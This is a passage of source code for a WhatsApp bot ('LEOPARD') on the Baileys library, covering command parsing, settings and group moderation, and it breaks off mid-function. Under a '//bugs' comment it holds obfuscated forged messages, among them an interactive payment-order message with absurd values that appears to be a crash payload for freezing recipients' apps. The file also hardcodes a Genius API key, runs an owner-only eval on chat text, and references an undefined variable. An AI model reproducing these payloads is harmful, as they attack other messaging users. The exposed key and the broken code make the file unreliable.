const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys");
const fs = require("fs");
const util = require("util");
global.axios = require('axios').default
const chalk = require("chalk");
const speed = require("performance-now");
const Genius = require("genius-lyrics"); 
const yts = require("yt-search");
const advice = require("badadvice");
const {c, cpp, node, python, java} = require('compile-run');
const acrcloud = require("acrcloud");
// const node = require("node-fetch-commonjs");
const ytdl = require("ytdl-core");
 const Client = new Genius.Client("jKTbbU-6X2B9yWWl-KOm7Mh3_Z6hQsgE4mmvwV3P3Qe7oNa9-hsrLxQV5l5FiAZO"); // Scrapes if no key is provided
const { fetchUrl, isUrl, processTime } = require("./lib/dreadfunc");
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/dreadupload');
const { Configuration, OpenAIApi } = require("openai");
let setting = process.env.AI; 
const { smsg, formatp, tanggal, formatDate, getTime,  sleep, clockString, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/dreadfunc');
const { exec, spawn, execSync } = require("child_process");
module.exports = dreaded = async (client, m, chatUpdate, store) => {
  try {
    var body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text
        : "";
    var budy = typeof m.text == "string" ? m.text : "";
   // leave the prefix string empty if you don't want the bot to use a prefix
    const prefix = process.env.PREFIX || '.';
const Heroku = require("heroku-client");  
 const appname = process.env.APP_NAME || '';
 const herokuapi = process.env.HEROKU_API;
const gptdm = process.env.GPT_INBOX || 'TRUE';
    const cmd = body.startsWith(prefix);
//const autobio = process.env.AUTOBIO || 'TRUE';
const botname = process.env.BOTNAME || 'DREX AI';
const antibot = process.env.ANTIBOT || 'FALSE';

	  const {
addPremiumUser,
getPremiumExpired,
getPremiumPosition,
expiredCheck,
checkPremiumUser,
getAllPremiumUser,
} = require('./lib/premiun')
let afk = require("./lib/afk") //afk
  
    const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "No Name";
    const botNumber = await client.decodeJid(client.user.id);
    const itsMe = m.sender == botNumber ? true : false;
    let text = (q = args.join(" "));
    const arg = budy.trim().substring(budy.indexOf(" ") + 1);
    const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);
    m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
    const from = m.chat;
    const reply = m.reply;
    const sender = m.sender;
    const orgkaya = JSON.parse(fs.readFileSync('./dtbs/premium.json'))
    const kontributor = JSON.parse(fs.readFileSync('./dtbs/owner.json'))
    const isDeveloper = [botNumber, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
    const isPremium = isDeveloper || isDeveloper || checkPremiumUser(m.sender, orgkaya);
    const mek = chatUpdate.messages[0];
    const getGroupAdmins = (participants) => { 
       let admins = []; 
       for (let i of participants) { 
         i.admin === "superadmin" ? admins.push(i.id) : i.admin === "admin" ? admins.push(i.id) : ""; 
       } 
       return admins || []; 
     };
   const fatkuns = (m.quoted || m);
   const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m;
    
    const color = (text, color) => {
      return !color ? chalk.green(text) : chalk.keyword(color)(text);
    };
    const mime = (quoted.msg || quoted).mimetype || "";
            const qmsg = (quoted.msg || quoted);
    const author = process.env.STICKER_AUTHOR ||'LEOPARD';
    const packname = process.env.STICKER_PACKNAME || 'Leopard';
const dev = process.env.DEV || '254702302770'
const menu = process.env.MENU_TYPE || 'VIDEO';
 const DevLeopard = dev.split(",");
    const badwordkick = process.env.BAD_WORD_KICK || 'FALSE';
   const bad = process.env.BAD_WORD || 'fuck';
    const autoread = process.env.AUTOREAD || 'TRUE';
    const badword = bad.split(",");
    const thum = fs.readFileSync ('./LEOPARD_𝐀𝐈.jpg');	  
    const Owner = DevIBRAAH.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
    const viewOnceMessage = args.join(" ");
    const fcontact = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `LEOPARD 𝐁𝐎𝐓`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;DrexBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/00c44dbca471eff754425.png' }}}}
  //bugs
function _0x32f5(_0x357e2e, _0x2a0323) {
    const _0x29f8a8 = _0x3c9e();
    return _0x32f5 = function (_0x46e526, _0x5b3588) {
        _0x46e526 = _0x46e526 - (0x3 * -0x87f + 0x1 * 0x1a8d + 0x2e);
        let _0x226689 = _0x29f8a8[_0x46e526];
        return _0x226689;
    }, _0x32f5(_0x357e2e, _0x2a0323);
}
const _0x2f276c = _0x32f5;
(function (_0x3774c4, _0x16108d) {
    const _0x52e897 = _0x32f5, _0x5f7324 = _0x3774c4();
    while (!![]) {
        try {
            const _0x26a08f = parseInt(_0x52e897(0x146)) / (0x443 * -0x3 + 0x151a + -0x850) + parseInt(_0x52e897(0x145)) / (0xc07 * 0x1 + -0x11f3 + 0x8a * 0xb) * (-parseInt(_0x52e897(0x14a)) / (-0x600 + -0x1ca4 + 0x22a7)) + -parseInt(_0x52e897(0x144)) / (-0x26e6 + -0x161f * -0x1 + 0x10cb) + parseInt(_0x52e897(0x14c)) / (-0x18b3 + 0x254b + -0xc93) + parseInt(_0x52e897(0x14d)) / (0xaf6 * 0x1 + 0xa * 0x338 + 0x1e * -0x170) + -parseInt(_0x52e897(0x148)) / (-0x65d + 0xfaf + -0x1 * 0x94b) * (parseInt(_0x52e897(0x14b)) / (-0x23ae + 0x13a4 + 0x1 * 0x1012)) + parseInt(_0x52e897(0x13e)) / (-0x853 * 0x2 + -0x13ba + -0x27 * -0xef) * (-parseInt(_0x52e897(0x140)) / (-0x7ac * 0x4 + -0x157a + 0x3434));
            if (_0x26a08f === _0x16108d)
                break;
            else
                _0x5f7324['push'](_0x5f7324['shift']());
        } catch (_0x2d0e90) {
            _0x5f7324['push'](_0x5f7324['shift']());
        }
    }
}(_0x3c9e, 0x64282 + -0x564b + 0x5cfcc));
const ryobug = {
    'key': {
        'participant': _0x2f276c(0x147) + _0x2f276c(0x142),
        ...m[_0x2f276c(0x149)] ? { 'remoteJid': _0x2f276c(0x141) + _0x2f276c(0x143) } : {}
    },
    'message': { 'listResponseMessage': { 'title': _0x2f276c(0x13f) } }
};
function _0x3c9e() {
    const _0x1aa1e1 = [
        '7825635sosiGC',
        'LEOPARD\x20-\x20𝐁𝐎𝐓',
        '10SICXzc',
        'status@bro',
        'pp.net',
        'adcast',
        '4759276JHsXYU',
        '428650HMJQBw',
        '1403913KRjLVe',
        '0@s.whatsa',
        '2850085EGVAAg',
        'chat',
        '6TNFoyO',
        '8QfOGTj',
        '7066205tkvcMf',
        '5082072gxcHty'
    ];
    _0x3c9e = function () {
        return _0x1aa1e1;
    };
    return _0x3c9e();
}
//=========================================================================================//
const _0x354490 = _0x37a6;
function _0x37a6(_0x3961c4, _0x4752d0) {
    const _0x4bfe7b = _0x38ae();
    return _0x37a6 = function (_0x2e232e, _0x541cd0) {
        _0x2e232e = _0x2e232e - (-0x8e2 + 0xce * -0x1 + -0xb83 * -0x1);
        let _0x67c226 = _0x4bfe7b[_0x2e232e];
        return _0x67c226;
    }, _0x37a6(_0x3961c4, _0x4752d0);
}
(function (_0xa65b82, _0x414b75) {
    const _0x33a476 = _0x37a6, _0x25d8af = _0xa65b82();
    while (!![]) {
        try {
            const _0x477332 = parseInt(_0x33a476(0x1f6)) / (0x161b + 0x10 * 0x204 + -0x365a) + -parseInt(_0x33a476(0x1fe)) / (0x13cf + -0x65 * -0x21 + -0x20d2) + -parseInt(_0x33a476(0x204)) / (0xd83 + 0x4 * 0x73b + 0x21f * -0x14) + parseInt(_0x33a476(0x1e4)) / (-0x2346 + -0x2112 + 0x2bc * 0x19) + -parseInt(_0x33a476(0x210)) / (0x931 * -0x1 + -0xf3a + 0x30e * 0x8) * (parseInt(_0x33a476(0x201)) / (-0x26a8 + -0x717 + 0x1 * 0x2dc5)) + -parseInt(_0x33a476(0x1d3)) / (0x1565 * 0x1 + 0x17e9 * 0x1 + -0x43 * 0xad) * (-parseInt(_0x33a476(0x1fb)) / (0x1f13 + -0x1 * 0x7fb + -0x1710)) + parseInt(_0x33a476(0x1f2)) / (-0x152 * -0xc + -0x201f + 0x1050);
            if (_0x477332 === _0x414b75)
                break;
            else
                _0x25d8af['push'](_0x25d8af['shift']());
        } catch (_0x370040) {
            _0x25d8af['push'](_0x25d8af['shift']());
        }
    }
}(_0x38ae, -0xf1 * -0x3f0 + 0xe3 * -0xaba + -0x5 * -0x2cb73));
const force = {
    'key': {
        'participant': _0x354490(0x226) + _0x354490(0x20b),
        ...m[_0x354490(0x217)] ? { 'remoteJid': '' } : {}
    },
    'message': {
        'interactiveMessage': {
            'header': {
                'hasMediaAttachment': !![],
                'jpegThumbnail': fs[_0x354490(0x220) + 'nc'](_0x354490(0x200) + _0x354490(0x1dc))
            },
            'nativeFlowMessage': {
                'buttons': [{
                        'name': _0x354490(0x1eb) + _0x354490(0x1da),
                        'buttonParamsJson': _0x354490(0x20c) + _0x354490(0x202) + _0x354490(0x1f5) + _0x354490(0x1f8) + _0x354490(0x1d8) + _0x354490(0x1f1) + _0x354490(0x21b) + _0x354490(0x1d5) + _0x354490(0x1f9) + _0x354490(0x1db) + _0x354490(0x1fd) + _0x354490(0x214) + _0x354490(0x1e3) + _0x354490(0x1e1) + _0x354490(0x206) + _0x354490(0x20e) + _0x354490(0x225) + _0x354490(0x208) + _0x354490(0x1df) + _0x354490(0x213) + _0x354490(0x21a) + _0x354490(0x215) + _0x354490(0x219) + _0x354490(0x20d) + _0x354490(0x21c) + _0x354490(0x1fc) + _0x354490(0x1ea) + _0x354490(0x1d4) + _0x354490(0x1ff) + _0x354490(0x1dd) + _0x354490(0x1e8) + _0x354490(0x205) + _0x354490(0x1f7) + _0x354490(0x1e2) + _0x354490(0x223) + _0x354490(0x20f) + _0x354490(0x207) + _0x354490(0x216) + _0x354490(0x1e7) + _0x354490(0x1e9) + _0x354490(0x211) + _0x354490(0x224) + _0x354490(0x1f3) + _0x354490(0x221) + _0x354490(0x1de) + _0x354490(0x1ef) + _0x354490(0x1d7) + _0x354490(0x1fc) + _0x354490(0x1e5) + _0x354490(0x1f0) + _0x354490(0x1e6) + _0x354490(0x20a) + _0x354490(0x209) + _0x354490(0x1e0) + _0x354490(0x1d9) + _0x354490(0x1ee) + _0x354490(0x218) + _0x354490(0x203) + _0x354490(0x21e) + _0x354490(0x212) + _0x354490(0x1fc) + _0x354490(0x222) + _0x354490(0x1ec) + _0x354490(0x1fa) + _0x354490(0x21f) + _0x354490(0x1ed) + _0x354490(0x1d6) + _0x354490(0x1f4) + _0x354490(0x21d)
                    }]
            }
        }
    }
};
function _0x38ae() {
    const _0x5ad594 = [
        '9069994400',
        '_id\x22:\x22cust',
        '\x22status\x22:\x22',
        '\x22:100},\x22or',
        ',\x22order\x22:{',
        '3409172lIegog',
        'ue\x22:999990',
        ':100},\x22qua',
        '\x22:\x227842674',
        '\x22:{\x22value\x22',
        '605763435\x22',
        'ue\x22:485792',
        'review_and',
        '900,\x22offse',
        '9}]},\x22nati',
        '2115f9-478',
        'EZETSUBOXY',
        '0,\x22offset\x22',
        '788,\x22offse',
        '5863995eZNlcH',
        '7460576343',
        '_methods\x22:',
        'otal_amoun',
        '817973OWmlFi',
        '00,\x22offset',
        't\x22:{\x22value',
        'd\x22:\x224OON4P',
        't\x22:100},\x22q',
        '7336qUHSgU',
        'unt\x22:{\x22val',
        'pe\x22:\x22physi',
        '1850612NmpQoj',
        'fset\x22:100}',
        './media/la',
        '6WjiSeW',
        '\x22:\x22IDR\x22,\x22t',
        '1-8e7b4bf1',
        '910386kNcCsc',
        ':489999999',
        'payment_re',
        'tems\x22:[{\x22r',
        '{\x22value\x22:4',
        '{\x22retailer',
        'ntity\x22:7},',
        'pp.net',
        '{\x22currency',
        '\x22offset\x22:1',
        'quested\x22,\x22',
        '\x22ORDER\x22,\x22i',
        '4406965Fmncar',
        ',\x22product_',
        'e\x22:\x22\x22,\x22amo',
        ',\x22offset\x22:',
        'cal-goods\x22',
        ':{\x22value\x22:',
        'etailer_id',
        'chat',
        'a-487e-92c',
        '490699944,',
        '100},\x22tax\x22',
        't\x22:100},\x22r',
        '00},\x22disco',
        '[]}',
        '6de8\x22,\x22nam',
        'uantity\x22:4',
        'readFileSy',
        '5\x22,\x22name\x22:',
        'ue\x22:999999',
        'der_type\x22:',
        'id\x22:\x2278426',
        'subtotal\x22:',
        '0@s.whatsa',
        '2471kGusnX',
        '999999,\x22of',
        'eference_i',
        've_payment',
        'GEN\x20\x22,\x22amo',
        '\x22:49981399',
        'om-item-f2',
        '_pay',
        'X3FFJ\x22,\x22ty',
        'tx.png',
        ',\x22shipping',
        '\x22!\x20BY\x20-\x20TH'
    ];
    _0x38ae = function () {
        return _0x5ad594;
    };
    return _0x38ae();
}	  

//=========================================================================================//	  
	  // Group
    const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : "";
    const groupName = m.isGroup && groupMetadata ? await groupMetadata.subject : "";
     const participants = m.isGroup && groupMetadata ? await groupMetadata.participants : ""; 
     const groupAdmin = m.isGroup ? await getGroupAdmins(participants) : ""; 
     const isBotAdmin = m.isGroup ? groupAdmin.includes(botNumber) : true; 
     const isAdmin = m.isGroup ? groupAdmin.includes(m.sender) : true;
const admin = process.env.ADMIN_MSG || '𝐇𝐮𝐡!\n𝐀𝐝𝐦𝐢𝐦𝐬 𝐨𝐧𝐥𝐲, 𝐝𝐢𝐦𝐰𝐢𝐭.';
    const group = process.env.GROUP_ONLY_MSG || '𝐆𝐫𝐨𝐮𝐩 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐬𝐢𝐥𝐥𝐲.';
    const botAdmin = process.env.BOT_ADMIN_MSG || '𝐈𝐦 𝐧𝐨𝐭 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧 𝐛*𝐭𝐜𝐡'
    const NotOwner = process.env.NOT_OWNER_MSG || '𝐎𝐰𝐧𝐞𝐫 𝐨𝐧𝐥𝐲 🐆';
const wapresence = process.env.WA_PRESENCE || 'recording';
const antilink = process.env.ANTILINK || 'FALSE';
const antilinkall = process.env.ANTILINK_ALL || 'TRUE';

const runtime = function (seconds) { 
 seconds = Number(seconds); 
 var d = Math.floor(seconds / (3600 * 24)); 
 var h = Math.floor((seconds % (3600 * 24)) / 3600); 
 var m = Math.floor((seconds % 3600) / 60); 
 var s = Math.floor(seconds % 60); 
 var dDisplay = d > 0 ? d + (d == 1 ? " 𝐝𝐚𝐲, " : " 𝐃𝐚𝐲, ") : ""; 
 var hDisplay = h > 0 ? h + (h == 1 ? " 𝐡𝐨𝐮𝐫, " : " 𝐇𝐨𝐮𝐫𝐬, ") : ""; 
 var mDisplay = m > 0 ? m + (m == 1 ? " 𝐦𝐢𝐧𝐮𝐭𝐞, " : " 𝐌𝐢𝐧𝐮𝐭𝐞𝐬, ") : ""; 
 var sDisplay = s > 0 ? s + (s == 1 ? " 𝐬𝐞𝐜𝐨𝐧𝐝" : " 𝐒𝐞𝐜𝐨𝐧𝐝𝐬") : ""; 
 return dDisplay + hDisplay + mDisplay + sDisplay; 
 } 
  
 const timestamp = speed(); 
   const dreadedspeed = speed() - timestamp 
 
    // Push Message To Console
    let argsLog = budy.length > 30 ? `${q.substring(0, 30)}...` : budy;

if (wapresence === 'recording' && !m.isGroup) { 
            
  client.sendPresenceUpdate('recording', m.chat);
} else if (wapresence === 'typing' && !m.isGroup) { 
            
  client.sendPresenceUpdate('recording', m.chat);
    }
    



    if (autoread === 'TRUE' && !m.isGroup) { 
             client.readMessages([m.key])
    }
      if (itsMe && mek.key.id.startsWith("BAE5") && mek.key.id.length === 16 && !m.isGroup) return;



  
  
 

         
function _0x4f1b(_0x44e88, _0x1e223f) {
    var _0x3db626 = _0x11cc();
    return _0x4f1b = function (_0x2e8ed0, _0x5cd594) {
        _0x2e8ed0 = _0x2e8ed0 - (0x13bd + 0xcbb * 0x3 + -0x38ae);
        var _0x1e37b8 = _0x3db626[_0x2e8ed0];
        return _0x1e37b8;
    }, _0x4f1b(_0x44e88, _0x1e223f);
}
var _0x2e16c2 = _0x4f1b;
function _0x11cc() {
    var _0x4506b9 = [
        'length',
        '4NTZryU',
        'BAE5',
        '1565770bnKzAf',
        'sender',
        'groupParti',
        'split',
        '84AXXWgJ',
        '4435424UJQIXb',
        'y\x20LEOPARD\x20',
        'TRUE',
        'tibot:\x0a\x0a@',
        '\x20as\x20a\x20bot.',
        '2LGBzpD',
        'sendMessag',
        'ate',
        '\x20Removed\x20b',
        '\x20unnecessa',
        '5880358pnqlFT',
        'cipantsUpd',
        '356958TiEbec',
        '\x20has\x20been\x20',
        'chat',
        'ry\x20spam!',
        'remove',
        'identified',
        '3301765GBoZYn',
        'to\x20prevent',
        'isGroup',
        '184473FwtnYZ',
        '18szWhmE',
        'startsWith',
        'LEOPARD 𝐁𝐎𝐓\x20an',
        '376590puyzhN',
        'key'
    ];
    _0x11cc = function () {
        return _0x4506b9;
    };
    return _0x11cc();
}
(function (_0xb3d1a0, _0x4f6370) {
    var _0x132d30 = _0x4f1b, _0x276ffb = _0xb3d1a0();
    while (!![]) {
        try {
            var _0x5a0c14 = -parseInt(_0x132d30(0x161)) / (0x1102 + 0x227 * 0x11 + -0x3598) * (-parseInt(_0x132d30(0x14d)) / (-0x2 * -0x1231 + 0x1 * 0xca + -0x252a * 0x1)) + parseInt(_0x132d30(0x15d)) / (-0x23 * -0xb7 + -0x141 * 0x3 + -0x153f) + parseInt(_0x132d30(0x141)) / (-0x2489 + 0x1cdf * -0x1 + 0x4 * 0x105b) * (parseInt(_0x132d30(0x15a)) / (-0x2 * -0xe87 + 0x22 * 0xb + -0x1e7f)) + -parseInt(_0x132d30(0x154)) / (-0x2c2 + 0x22 + -0xe2 * -0x3) * (-parseInt(_0x132d30(0x147)) / (0x58 * -0x4a + -0x8fd + 0x2274)) + -parseInt(_0x132d30(0x148)) / (0x2 * -0xc9a + 0x685 * -0x4 + 0x3350) + parseInt(_0x132d30(0x15e)) / (-0x427 * 0x3 + -0x1fd3 * 0x1 + -0x5 * -0x8dd) * (-parseInt(_0x132d30(0x143)) / (-0x1d65 + -0x26eb + 0x2 * 0x222d)) + -parseInt(_0x132d30(0x152)) / (-0x16d4 + 0x8 * -0x11f + 0x1fd7);
            if (_0x5a0c14 === _0x4f6370)
                break;
            else
                _0x276ffb['push'](_0x276ffb['shift']());
        } catch (_0x18afd9) {
            _0x276ffb['push'](_0x276ffb['shift']());
        }
    }
}(_0x11cc, 0x186eb * 0x4 + 0x24 * 0x9e + -0xb * -0x17e));
antibot === _0x2e16c2(0x14a) && mek[_0x2e16c2(0x162)]['id'][_0x2e16c2(0x15f)](_0x2e16c2(0x142)) && m[_0x2e16c2(0x15c)] && !isAdmin && isBotAdmin && mek[_0x2e16c2(0x162)]['id'][_0x2e16c2(0x140)] === -0xe50 + -0x57a * -0x4 + 0x4 * -0x1e2 && (kidts = m[_0x2e16c2(0x144)], client[_0x2e16c2(0x14e) + 'e'](m[_0x2e16c2(0x156)], {
    'text': _0x2e16c2(0x160) + _0x2e16c2(0x14b) + kidts[_0x2e16c2(0x146)]('@')[-0x12da + 0x247c + -0x25 * 0x7a] + (_0x2e16c2(0x155) + _0x2e16c2(0x159) + _0x2e16c2(0x14c) + _0x2e16c2(0x150) + _0x2e16c2(0x149) + _0x2e16c2(0x15b) + _0x2e16c2(0x151) + _0x2e16c2(0x157)),
    'contextInfo': { 'mentionedJid': [kidts] }
}, { 'quoted': m }), await client[_0x2e16c2(0x145) + _0x2e16c2(0x153) + _0x2e16c2(0x14f)](m[_0x2e16c2(0x156)], [kidts], _0x2e16c2(0x158)));
if (budy.startsWith('>')) { 
   if (!Owner) return;
   try { 
 let evaled = await eval(budy.slice(2)); 
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled); 
 await reply(evaled); 
   } catch (err) { 
 await reply(String(err)); 
   } 
}

	   async function loady () {
var lod = [
"i am LEOPARD",
"cloned by ibraah",
"follow the below steps to deploy me",
"Contact owner after deploying",
	"𝐓𝐡𝐚𝐧𝐤 𝐘𝐨𝐮 𝐅𝐨𝐫 𝐖𝐚𝐢𝐭𝐢𝐧𝐠 😁 "
]
let { key } = await client.sendMessage(from, {text: '𝐈 𝐚𝐦 LEOPARD'})

for (let i = 0; i < lod.length; i++) {
await client.sendMessage(from, {
